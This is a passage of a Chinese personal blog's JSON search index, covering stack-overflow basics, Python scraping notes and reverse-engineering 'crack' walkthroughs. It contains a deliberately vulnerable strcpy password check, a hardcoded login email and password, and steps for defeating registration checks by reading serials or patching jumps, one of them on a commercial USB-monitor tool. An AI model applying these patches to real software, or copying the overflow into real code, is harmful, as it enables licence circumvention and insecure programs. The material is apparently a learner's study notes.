printf(&quot;0x%08x\\n&quot;,&amp;s1); //打印各静态变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;s2); printf(&quot;0x%08x\\n\\n&quot;,&amp;s3); system(&quot;pause&quot;); return 0; &#125; 可以看出本地变量和全局&#x2F;静态变量的分布完全不同，相差甚远，这是因为他们分布在不同类型的区域。进程的内存空间分为：代码区，静态数据区和动态数据区。全局和静态变量分配在静态数据区，本地变量分配在动态数据区，即”堆栈“， 2. 栈的存储 #include &lt;stdio.h&gt; void __stdcall func(int param1,int param2,int param3) &#123; int var1=param1; int var2=param2; int var3=param3; printf(&quot;0x%08x\\n&quot;,&amp;parameter1); //打印出各个变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;parameter2); printf(&quot;0x%08x\\n\\n&quot;,&amp;parameter3); printf(&quot;0x%08x\\n&quot;,&amp;var1); printf(&quot;0x%08x\\n&quot;,&amp;var2); printf(&quot;0x%08x\\n\\n&quot;,&amp;var3); return; &#125; int main() &#123; func(1,2,3); return 0; &#125; 函数的参数是从右向左传递，即先压栈parameter 3，然后parameter 2，最后才是parameter 1，然后是函数的返回地址，然后就是本地变量var1，var2,var3 3.程序进入main()函数 ，栈帧的保存和关闭例如： int main（） &#123; return0； &#125; 汇编代码为： push ebp; 保存进入main()函数时其他初始化函数的栈底 move ebp,esp; 把当前esp的值作为栈底 sub esp ,40h 开辟栈空间，作为局部变量的存储空间 push ebx push esi push edi 保存寄存器的值 LEA edi ,[ebp-40h] 取出此函数可用栈空间首地址 mov ecx,10h 设置ecx寄存器的值 mov eax ,occcccccch 把局部变量初始化为0xcccccccch rep stos dword ptr [edi] 根据ecx的值，把eax的内容，以四字节为单位写到edi指向的内存 xor eax,eax 设置返回值为0 pop edi pop esi pop ebx 弹出压入寄存器的值 add esp,40h 降低esp,局部空间释放 cmp ebp,esp 检查栈平衡 call _chkesp() 进入栈错误检查函数 mov esp.ebp 还原esp pop ebp 还原ebp ret 4. 简单的分配栈帧及溢出修改相邻变量例如： #include &lt;windows.h&gt; #define PASSWORD &quot;1234567&quot; int verify_password(char *password)&#123; int authenticated; char buffer[8]; authenticated = strcmp(password,PASSWORD); strcpy(buffer,password); return authenticated; &#125; int main(int argc, char* argv[]) &#123; int valid_flag = 0; char password[1024]; FILE *fp; if (!(fp=fopen(&quot;password.txt&quot;,&quot;rw+&quot;)))&#123; return 0; &#125; fscanf(fp,&quot;%s&quot;,password); valid_flag = verify_password(password); if(valid_flag)&#123; printf(&quot;incorrect password!\\n&quot;); &#125;else&#123; printf(&quot;Congratulation! You have passed the verification !\\n&quot;); &#125; Sleep(-1); return 1; &#125; 用OD调试：进入main()主函数，找到验证密码的函数调用位置，进入到函数具体代码处： 前面部分就是栈分配局部变量空间和初始化的过程，然后就是字符串的计较，最后是字符串的复制，分析可得栈溢出在这一部分，在指令008D1409处把函数的返回值（EAX储存的是返回值）存在了EBP-0XC处，下面就是strocpy的操作，char buffer[8]分配了八个字节的存储空间，但是password.txt的密码如图为24个字节，知错执行strcpy的时候，把buffer 附近的变量空间也给覆盖了，比如返回值的。以上过程如图所示","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"简单爬虫","slug":"spider","date":"2017-07-05T16:00:00.000Z","updated":"2023-07-22T06:23:26.826Z","comments":true,"path":"2017/07/06/spider/","link":"","permalink":"http://zwjsfdbb.top/2017/07/06/spider/","excerpt":"-- coding: utf-8 -- #可解决诸多编码问题，建议程序加上 # import urllib2 # import urllib 1 .直接传输数据。利用urllib2# response =urllib2.urlopen(&#39;http://www.baidu.com&#39;) # print response.read() #首先建立一个request实例，可以在构建请求的时候加入其他内容，比如data和header #request=urllib2.request(url) #response=urllib2.urlopen(request) #print response.read() 2.post方式传递数据和get方式# post方式传送数据 # values=&#123;&#39;username&#39;:&#39;1265616844@qq.com&#39;,&#39;password&#39;:&#39;scu123456&#39;&#125; # data=urllib.urlencode(values) # request=urllib2.request(&#39;http://www.baidu.com&#39;,data) # response=urllib2.urlopen(request) # print response.read() #get方式出传送数据 # values=&#123;&#39;username&#39;:&#39;1265616844@qq.com&#39;,&#39;password&#39;:&#39;scu123456&#39;&#125; # data=urllib.urlencode(values) # url=&quot;http://www.baidu.com&quot;+&quot;?&quot;+data # request=urllib2.request(url) # response=urllib2.urlopen(request) # print response.read() 3 .模拟登陆# 构建request实例的时候，加入header模拟登陆 # values=&#123;&#39;username&#39;:&#39;1265616844@qq.com&#39;,&#39;password&#39;:&#39;scu123456&#39;&#125; # data=urllib.urlencode(values) # headers=&#123;&#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&#39;,&#39;Referer&#39;:&#39;https://www.baidu.com/link?url=E3phPx1eObXAfu4bCGSc2YVs58W76-YCXkEtiAN51lC&amp;wd=&amp;eqid=8815b85d0006fca2000000035915d702&#39;&#125; # request=urllib2.request(&#39;http://www.baidu.com&#39;,data,headers) # response=urllib2.urlopen(request) # print response.read() 4.设置代理服务器# 设置代理服务器解决ip频繁访问被封问题 # import urllib2 # enable_proxy=True # proxy_handler=urllib2.ProxyHander(&#123;&quot;http&quot;:&#39;http://some-proxy.com:8080&#39;&#125;) # null_proxy_handler=urllib2.build_opener(proxy_handler) # if enable_proxy: # opener=urllib2.build_opener(proxy_handler) # else: # opener=urllib2.build_opener(null_proxy_handler) #urllib2.install_opener(opener) #","text":"-- coding: utf-8 -- #可解决诸多编码问题，建议程序加上 # import urllib2 # import urllib 1 .直接传输数据。利用urllib2# response =urllib2.urlopen(&#39;http://www.baidu.com&#39;) # print response.read() #首先建立一个request实例，可以在构建请求的时候加入其他内容，比如data和header #request=urllib2.request(url) #response=urllib2.urlopen(request) #print response.read() 2.post方式传递数据和get方式# post方式传送数据 # values=&#123;&#39;username&#39;:&#39;1265616844@qq.com&#39;,&#39;password&#39;:&#39;scu123456&#39;&#125; # data=urllib.urlencode(values) # request=urllib2.request(&#39;http://www.baidu.com&#39;,data) # response=urllib2.urlopen(request) # print response.read() #get方式出传送数据 # values=&#123;&#39;username&#39;:&#39;1265616844@qq.com&#39;,&#39;password&#39;:&#39;scu123456&#39;&#125; # data=urllib.urlencode(values) # url=&quot;http://www.baidu.com&quot;+&quot;?&quot;+data # request=urllib2.request(url) # response=urllib2.urlopen(request) # print response.read() 3 .模拟登陆# 构建request实例的时候，加入header模拟登陆 # values=&#123;&#39;username&#39;:&#39;1265616844@qq.com&#39;,&#39;password&#39;:&#39;scu123456&#39;&#125; # data=urllib.urlencode(values) # headers=&#123;&#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&#39;,&#39;Referer&#39;:&#39;https://www.baidu.com/link?url=E3phPx1eObXAfu4bCGSc2YVs58W76-YCXkEtiAN51lC&amp;wd=&amp;eqid=8815b85d0006fca2000000035915d702&#39;&#125; # request=urllib2.request(&#39;http://www.baidu.com&#39;,data,headers) # response=urllib2.urlopen(request) # print response.read() 4.设置代理服务器# 设置代理服务器解决ip频繁访问被封问题 # import urllib2 # enable_proxy=True # proxy_handler=urllib2.ProxyHander(&#123;&quot;http&quot;:&#39;http://some-proxy.com:8080&#39;&#125;) # null_proxy_handler=urllib2.build_opener(proxy_handler) # if enable_proxy: # opener=urllib2.build_opener(proxy_handler) # else: # opener=urllib2.build_opener(null_proxy_handler) #urllib2.install_opener(opener) # 5.捕获url异常的写法# # import urllib2 # request = urllib2.Request(&#39;http://www.baidu&#39;) # try: # print urllib2.urlopen(request).read() # except urllib2.URLError, e: # print e.reason # 6.捕获httperror 的写法# import urllib2 # req=urllib2.Request(&quot;http://blog.csdn.net/cqcre&quot;) # try: # print urllib2.urlopen(req) # except urllib2.HTTPError,e: # print e.code # print e.reason # except urllib2.URLError,e: # print e.reason #requires 库的使用 # import requests # s = requests.session() # s.headers.update(&#123;&#39;x-test&#39;: &#39;true&#39;&#125;) # r = s.get(&#39;http://httpbin.org/headers&#39;, headers=&#123;&#39;x-test2&#39;: &#39;true&#39;&#125;) # print r.text 7.正则匹配Example 1 # import re # a=&#39;ba91c&#39; # pattern=re.compile(r&quot;a\\d&#123;1,2&#125;c&quot;) # if re.match(pattern,a): #开头必须匹配 # print &#39;success&#39; # if re.search(pattern,a): #开头不要求匹配 # print &#39;research success &#39; # pattern=re.compile(r&quot;\\d+&quot;) # print re.split(pattern,a) # print re.findall(pattern,a) Example 2 # import urllib # import json # import urllib2 # import re # from bs4 import BeautifulSoup # page=1 # url = &#39;http://www.qiushibaike.com/hot/page/&#39; + str(page) # headers=&#123;&#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&#39;&#125; # try: # req=urllib2.Request(url,headers=headers) # response=urllib2.urlopen(req) # print response.code # content=response.read().decode(&#39;utf-8&#39;) # pattern = re.compile(r&#39;&lt;a href=.*? target=.*? title=.*?&gt;.*?&lt;h2&gt;(.*?)&lt;/h2&gt;.*?&lt;span&gt;(.*?)&lt;/span&gt;.*?&lt;i class=&quot;number&quot;&gt;(.*?)&lt;/i&gt;&#39;, re.S) # items=re.findall(pattern,content) # for item in items: # print json.dumps(item[0], encoding=&quot;UTF-8&quot;, ensure_ascii=False),json.dumps(item[1], encoding=&quot;UTF-8&quot;, ensure_ascii=False),json.dumps(item[2], encoding=&quot;UTF-8&quot;, ensure_ascii=False) # except urllib2.URLError,e: # if hasattr(e,&quot;code&quot;): # print e.code # if hasattr(e,&quot;reason&quot;): # print e.reason 8.时间戳# from datetime import datetime # import time # a =datetime.now() # #sleep(10) # time.sleep(10) # b=datetime.now() # print (b-a).seconds 9.beautifulsoup 的学习# from bs4 import BeautifulSoup # html = &quot;&quot;&quot; # &lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#39;s story&lt;/title&gt;&lt;/head&gt; # &lt;body&gt; # &lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s story&lt;/b&gt;&lt;/p&gt; # &lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were # &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;, # &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and # &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;; # and they lived at the bottom of a well.&lt;/p&gt; # &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt; # &quot;&quot;&quot; # soup=BeautifulSoup(html,&#39;lxml&#39;) # for p in soup.p.next_siblings : #同级兄弟节点 # print p # print soup.prettify() # print soup.title # print soup.title.string # for string in soup.body.stripped_strings: # print string # print soup.a # print soup.a.string # print soup.head.contents # for children in soup.head.children: # print children #soup.findall() #还可以传入关键词如果一个指定名字的参数不是搜索内置的参数名, #搜索时会把该参数当作指定名字tag的属性来搜索,例如如果包含一 #个名字为 id 的参数,Beautiful Soup会搜索每个tag的”id”属性 #for examle soup.findall(id=&quot;link2&quot;) or soup.findall(href=re.compile(&#39;elsie&#39;) #print soup.find_all(attrs=&#123;&quot;name&quot;: &quot;dromouse&quot;&#125;) #soup.select() # print soup.select(&#39;title&#39;) #通过标签名 # print soup.select(&#39;.story&#39;) #通过类名 # print soup.select(&quot;#link1&quot;) #通过id # print soup.select(&quot;p #link1&quot;) #标签名和id 的组合 # print soup.select(&#39;a[class=&quot;sister&quot;]&#39;)#标签和类 10.selenium测试# -*- coding: utf-8 -*- # from selenium import webdriver # browser=webdriver.Chrome() # browser.get(&#39;http://www.baidu.com/&#39;) # import sys # reload(sys) # sys.setdefaultencoding(&#39;utf-8&#39;) # from selenium import webdriver # from selenium.webdriver.common.keys import Keys # # driver = webdriver.Chrome() # driver.get(&quot;http://www.python.org&quot;) # assert &quot;Python&quot; in driver.title # elem = driver.find_element_by_name(&quot;q&quot;) # elem.send_keys(&quot;pycon&quot;) # elem.send_keys(Keys.RETURN) # print driver.page_source 11. selenium 优化以登陆腾讯哈勃分析系统为例 主要的优化在于把time.sleep()这种强制等待多少秒换成隐式等待和显式等待。所谓隐式等待就是driver.implicitly_wait(30) 设置最大超时时间为30秒，当页面加载完毕以后，要查找的元素找到即进行下一步，而不必强行等待多少秒，所谓的显式等待就是等你所要查找的元素出现后进行下一步，WebDriverWait(driver, 60).until(EC.presence_of_element_located(locator)) 。 # -*- coding: utf-8 -*- # 登陆腾讯哈勃分析系统 import time import json from selenium import webdriver from selenium.webdriver.support.wait import WebDriverWait from selenium.webdriver.support import expected_conditions as EC from selenium.webdriver.common.by import By driver = webdriver.Chrome() time.sleep(3) driver.get(&#39;https://habo.qq.com/&#39;) #time.sleep(3) driver.implicitly_wait(30) #driver.implicitly_wait(30) driver.find_element_by_id(&quot;nologin&quot;).click() # time.sleep(5) #driver.implicitly_wait(30) driver.switch_to_frame(&#39;login_ifr&#39;) # print driver.page_source.encode(&#39;utf-8&#39;) driver.find_element_by_css_selector(&quot;#img_out_1031652154&quot;).click() # time.sleep(3) #driver.implicitly_wait(30) for i in range(1200,1300): filename=&#39;F:\\\\sample_malware\\\\1\\\\pdf\\\\&#39;+str(i)+&#39;.pdf&#39; driver.find_element_by_css_selector(&quot;#file_upload2&quot;).send_keys(filename) #time.sleep(15) #driver.implicitly_wait(30) time.sleep(3) print &#39;pdf&#39;+str(i) # try: # driver.find_element_by_id(&#39;file_upload_fail&#39;) # a = True # except: # a = False # if a == False: #time.sleep(6) locator=(By.ID,&quot;detail_frame&quot;) # driver.implicitly_wait(30) #driver.find_element_by_xpath(&quot;.//*[@id=&#39;detail_frame&#39;]/div[1]/div/div[1]/div[1]&quot;) try: WebDriverWait(driver, 60).until(EC.presence_of_element_located(locator)) driver.back() except: driver.refresh() # else: # pass # #driver.refresh() 遇到的问题： 注意:Frame&#x2F;Iframe原因定位不到元素： 1.这个是最常见的原因，首先要理解下frame的实质，frame中实际上是嵌入了另一个页面，而webdriver每次只能在一个页面识别，因此需要先定位到相应的frame，对那个页面里的元素进行定位。 例如：如果iframe有name或id的话，直接使用switch_to_frame(“name值”)或switch_to_frame(“id值”)。如下： driver=webdriver.Firefox() driver.get(r&#39;http://www.126.com/&#39;) driver.switch_to_frame(&#39;x-URS-iframe&#39;) #需先跳转到iframe框架 username=driver.find_element_by_name(&#39;email&#39;) username.clear() 如果iframe没有name或id的话，则可以通过下面的方式定位： #先定位到iframe elementi= driver.find_element_by_class_name(&#39;APP-editor-iframe&#39;) #再将定位对象传给switch_to_frame()方法 driver.switch_to_frame(elementi) 如果完成操作后，可以通过switch_to.parent_content()方法跳出当前iframe，或者还可以通过switch_to.default_content()方法跳回最外层的页面 2.关于窗口的切换用到switch_to_window(handle) 方法 例如： all_handles = driver.window_handles #获取所有窗口句柄 for handle in all_handles: if handle != now_handle: print handle #输出待选择的窗口句柄 driver.switch_to_window(handle) time.sleep(5) try: filename=driver.find_element_by_xpath(&quot;.//*[@id=&#39;baseinfo&#39;]/div/table/tbody/tr[1]/td[2]/p&quot;).text+&quot;.html&quot; with open(filename, &#39;w&#39;) as fp: fp.write(driver.page_source.encode(&#39;utf-8&#39;)) except: print str(j)+str(i) time.sleep(5) driver.close() #关闭当前窗口 time.sleep(3) print now_handle #输出主窗口句柄 driver.switch_to_window(now_handle) #返回主窗口 time.sleep(5) 12.requires库的使用两种模拟登陆的方式： 构建请求的表单数据来登录 # -*- coding: utf-8 -*- # import requests # import ConfigParser # import json # cf = ConfigParser.ConfigParser() # cf.read(&#39;config.ini&#39;) # username = cf.get(&#39;info&#39;, &#39;username&#39;) # password = cf.get(&#39;info&#39;, &#39;password&#39;) # csrfmiddlewaretoken=cf.get(&#39;info&#39;,&#39;csrfmiddlewaretoken&#39;) # ##g-recaptcha-response=cf.get(&#39;info&#39;,&#39;g-recaptcha-response&#39;) # session = requests.session() # login_data = &#123;&#39;username&#39;: username, &#39;password&#39;: password,&#39;csrfmiddlewaretoken&#39;:csrfmiddlewaretoken,&#39;g-recaptcha-response&#39;:cf.get(&#39;info&#39;,&#39;g-recaptcha-response&#39;)&#125; # header = &#123; # &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36&#39;, # &#39;Host&#39;: &#39;malwr.com&#39;, # &#39;Referer&#39;: &#39;https://malwr.com/account/login/&#39; # &#125; # # r = session.get(&#39;http://malwr.com/&#39;) # 实现验证码登陆 # r = session.post(&#39;https://malwr.com/account/login/&#39;, data=login_data, headers=header) # with open(&#39;123.html&#39;, &#39;w&#39;) as fp: # fp.write(r.content) 构建cookies来模拟登陆 # -*- coding: utf-8 -*- import requests import ConfigParser import json cf = ConfigParser.ConfigParser() cf.read(&#39;config.ini&#39;) cookies = cf.items(&#39;cookies&#39;) cookies = dict(cookies) header = &#123; &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&#39;, &#39;Host&#39;: &#39;malwr.com&#39;, &#39;Referer&#39;: &#39;https://malwr.com/account/login/&#39; &#125; session = requests.session() r = session.get(&#39;http://malwr.com/analysis/&#39;, cookies=cookies,headers=header) # 实现验证码登陆 with open(&#39;login.html&#39;, &#39;w&#39;) as fp: fp.write(r.content)","categories":[{"name":"python","slug":"python","permalink":"http://zwjsfdbb.top/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://zwjsfdbb.top/tags/python/"}]},{"title":"win10添加右键菜单","slug":"右键菜单","date":"2017-07-05T16:00:00.000Z","updated":"2023-07-27T14:06:36.174Z","comments":true,"path":"2017/07/06/右键菜单/","link":"","permalink":"http://zwjsfdbb.top/2017/07/06/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95/","excerpt":"1.win +R 打开运行窗口，输入regedit，进入注册表。 2.打开HKEY_CLASSES_ROOT*\\shell，右键新建项，输入项名，比如sublime，点击默认输入数值数据为你的程序名比如sublime。 3.点击新建项sublime,右键新建项，命名为command,必须为这个名字，然后点击默认，在数值数据那里输入你要添加的程序路径，比如我的sublime 为”E:\\Sublime Text 3\\sublime_text.exe” “%1”确定即可。 后续：邮件发送到菜单 1.运行 shell:sendto 2.新建你要添加到发送到的程序快捷方式即可","text":"1.win +R 打开运行窗口，输入regedit，进入注册表。 2.打开HKEY_CLASSES_ROOT*\\shell，右键新建项，输入项名，比如sublime，点击默认输入数值数据为你的程序名比如sublime。 3.点击新建项sublime,右键新建项，命名为command,必须为这个名字，然后点击默认，在数值数据那里输入你要添加的程序路径，比如我的sublime 为”E:\\Sublime Text 3\\sublime_text.exe” “%1”确定即可。 后续：邮件发送到菜单 1.运行 shell:sendto 2.新建你要添加到发送到的程序快捷方式即可","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"破解实例2","slug":"破解实例2","date":"2017-07-05T16:00:00.000Z","updated":"2023-07-27T14:02:34.135Z","comments":true,"path":"2017/07/06/破解实例2/","link":"","permalink":"http://zwjsfdbb.top/2017/07/06/%E7%A0%B4%E8%A7%A3%E5%AE%9E%E4%BE%8B2/","excerpt":"一、样本基本信息 破解样本 链接为 http://pan.baidu.com/s/1o8lwLiq 二、分析过程 首先打开样本程序，得到关键字符串“try again”，如下 打开IDA加载该样本程序。打开View-&gt;Open Subviws-&gt;Strings 字符串窗口，搜索关键字符串。 双击字符串，进入IDA-View 窗口，按table键转换为Pseudocode 窗口，这是反编译过来的c代码，观察它的逻辑。找到判断，跳转的位置。如图 可以看出调用了istrcmpA函数，比较输入字符串和要找的字符串，然后跳转。在这一行 代码处按table键切换窗口找到反汇编位置，如图是代码段0x00401094 的位置。 打开OD找到这个位置。此时我们在这个位置下断点可以看到，堆栈区显示两个字符串，一个是我们输入的字符串，而另一个就是实际的序列号。 有两种方法可以破解，第一种方法是直接输入这个序列号就行了，另一种是我们找到跳转到显示“try again ”的位置，修改跳转指令，步骤如下：","text":"一、样本基本信息 破解样本 链接为 http://pan.baidu.com/s/1o8lwLiq 二、分析过程 首先打开样本程序，得到关键字符串“try again”，如下 打开IDA加载该样本程序。打开View-&gt;Open Subviws-&gt;Strings 字符串窗口，搜索关键字符串。 双击字符串，进入IDA-View 窗口，按table键转换为Pseudocode 窗口，这是反编译过来的c代码，观察它的逻辑。找到判断，跳转的位置。如图 可以看出调用了istrcmpA函数，比较输入字符串和要找的字符串，然后跳转。在这一行 代码处按table键切换窗口找到反汇编位置，如图是代码段0x00401094 的位置。 打开OD找到这个位置。此时我们在这个位置下断点可以看到，堆栈区显示两个字符串，一个是我们输入的字符串，而另一个就是实际的序列号。 有两种方法可以破解，第一种方法是直接输入这个序列号就行了，另一种是我们找到跳转到显示“try again ”的位置，修改跳转指令，步骤如下： 方法1：输入“&#96;mddggzdl” ，显示”very good”. 方法2：分析断点附近的指令，单步调试发现跳转指令在指令“0040109A”处 当跳转实现时，跳转到”success” ,当跳转没有实现时，跳转到“fail” 。我们只需要修改这个跳转条件，让它的跳转调到”success”即可。分析指令我们知道把JE 改为“JNE”即可。如图：右键汇编，改JE为JNE，然后汇编，右键复制到可执行文件-所有修改-全部复制，在弹框中右键保存文件，输入保存的文件名，保存即可。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"破解实例3","slug":"破解实例3","date":"2017-07-05T16:00:00.000Z","updated":"2023-07-27T14:03:18.423Z","comments":true,"path":"2017/07/06/破解实例3/","link":"","permalink":"http://zwjsfdbb.top/2017/07/06/%E7%A0%B4%E8%A7%A3%E5%AE%9E%E4%BE%8B3/","excerpt":"一、样本基本信息 破解样本 链接为 http://pan.baidu.com/s/1bp1YnT1 二、分析过程 首先打开样本程序，得到关键字符串“序列号错误，再来一次！”，如下 打开IDA加载该样本程序。打开View-&gt;Open Subviws-&gt;Strings 字符串窗口，搜索关键字符串。 发现并没有关键字符串，然后我们打开导入表，发现导入表中有istrcmpA函数，这是一个很重要的函数，比较两个字符串是否相等，双加该字符串，得到IDA-View的导入表中IstrcmpA的位置，鼠标放在函数名的位置，按下X键，查找调用该函数的位置，点击进去，发现调用这个函数的位置，分析可知此处就是输入字符串进行比较的位置。","text":"一、样本基本信息 破解样本 链接为 http://pan.baidu.com/s/1bp1YnT1 二、分析过程 首先打开样本程序，得到关键字符串“序列号错误，再来一次！”，如下 打开IDA加载该样本程序。打开View-&gt;Open Subviws-&gt;Strings 字符串窗口，搜索关键字符串。 发现并没有关键字符串，然后我们打开导入表，发现导入表中有istrcmpA函数，这是一个很重要的函数，比较两个字符串是否相等，双加该字符串，得到IDA-View的导入表中IstrcmpA的位置，鼠标放在函数名的位置，按下X键，查找调用该函数的位置，点击进去，发现调用这个函数的位置，分析可知此处就是输入字符串进行比较的位置。 打开OD找到这个位置。此时我们在这个位置下断点运行程序，输入字符串“111111”，和“222222”，发现在堆栈区的字符串为“2009”和”222222“，故猜测字符串”111111“经过运算，得到2009然后和222222，进行比较，如果相等，即成功。实际测试发现果然如此。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"破解实例1","slug":"破解实例1","date":"2017-07-05T16:00:00.000Z","updated":"2023-07-27T14:01:54.042Z","comments":true,"path":"2017/07/06/破解实例1/","link":"","permalink":"http://zwjsfdbb.top/2017/07/06/%E7%A0%B4%E8%A7%A3%E5%AE%9E%E4%BE%8B1/","excerpt":"一、样本基本信息 U盘监控器破解实例链接：http://pan.baidu.com/s/1dEDiSYt 密码：srpe 二、分析过程 首先打开u盘监控器，获取注册关键信息， 如下的”注册失败”即为关键信息 使用FlexHEX获取该字符串的文件偏移地址，所谓文件偏移地址就是文件偏移地址是指数据在PE文件中的地址，是文件在磁盘上存放时相对于文件开头的偏移。文件偏移地址从pe文件的第一个字节开始计数，起始值为0。用十六进制工具（如WINHEX）打开文件所显示的地址就是文件偏移地址。如图”注册失败”的文件偏移地址为0x00081A79 使用OD获取该字符串的内存地址内存地址等于装载基址+文件偏移地址装载基址可以通过OD查看，如图可以看到0x00400000就是装载基址。即该字符串地址常量为0x481a79,右键查找&#x2F;常量 输入0x481a79 可以找到字符串所在位置，对应内存地址为0x00405d2d 使用W32DASM 找到该地址的上一个判断语句的位置。,如图，记下地址0x405cd2","text":"一、样本基本信息 U盘监控器破解实例链接：http://pan.baidu.com/s/1dEDiSYt 密码：srpe 二、分析过程 首先打开u盘监控器，获取注册关键信息， 如下的”注册失败”即为关键信息 使用FlexHEX获取该字符串的文件偏移地址，所谓文件偏移地址就是文件偏移地址是指数据在PE文件中的地址，是文件在磁盘上存放时相对于文件开头的偏移。文件偏移地址从pe文件的第一个字节开始计数，起始值为0。用十六进制工具（如WINHEX）打开文件所显示的地址就是文件偏移地址。如图”注册失败”的文件偏移地址为0x00081A79 使用OD获取该字符串的内存地址内存地址等于装载基址+文件偏移地址装载基址可以通过OD查看，如图可以看到0x00400000就是装载基址。即该字符串地址常量为0x481a79,右键查找&#x2F;常量 输入0x481a79 可以找到字符串所在位置，对应内存地址为0x00405d2d 使用W32DASM 找到该地址的上一个判断语句的位置。,如图，记下地址0x405cd2 在OD中找到此地址位置，右键汇编于此处，jg 改为jl 然后复制到二进制文件，保存文件即可。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"hexo 搭建博客(github)","slug":"搭建博客","date":"2017-07-05T03:01:39.000Z","updated":"2023-07-22T06:34:18.427Z","comments":true,"path":"2017/07/05/搭建博客/","link":"","permalink":"http://zwjsfdbb.top/2017/07/05/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/","excerpt":"步骤如下1、新建仓库 username.github.io 2、新建read.me 3、安装node.js4、安装git 5、安装hexo 6、修改hexo 的配置文件，和github仓库建立关联 7、购买域名，绑定username.github.io 8、发布博客 hexo clean &amp;&amp;hexo g &amp;&amp;hexo d 9、修改主题 详见 10、加入评论和订阅功能 （gittalk）","text":"步骤如下1、新建仓库 username.github.io 2、新建read.me 3、安装node.js4、安装git 5、安装hexo 6、修改hexo 的配置文件，和github仓库建立关联 7、购买域名，绑定username.github.io 8、发布博客 hexo clean &amp;&amp;hexo g &amp;&amp;hexo d 9、修改主题 详见 10、加入评论和订阅功能 （gittalk）","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]}],"categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"web","slug":"web","permalink":"http://zwjsfdbb.top/categories/web/"},{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"},{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"},{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"python","permalink":"http://zwjsfdbb.top/categories/python/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"web","slug":"web","permalink":"http://zwjsfdbb.top/tags/web/"},{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"},{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"},{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"python","permalink":"http://zwjsfdbb.top/tags/python/"}]}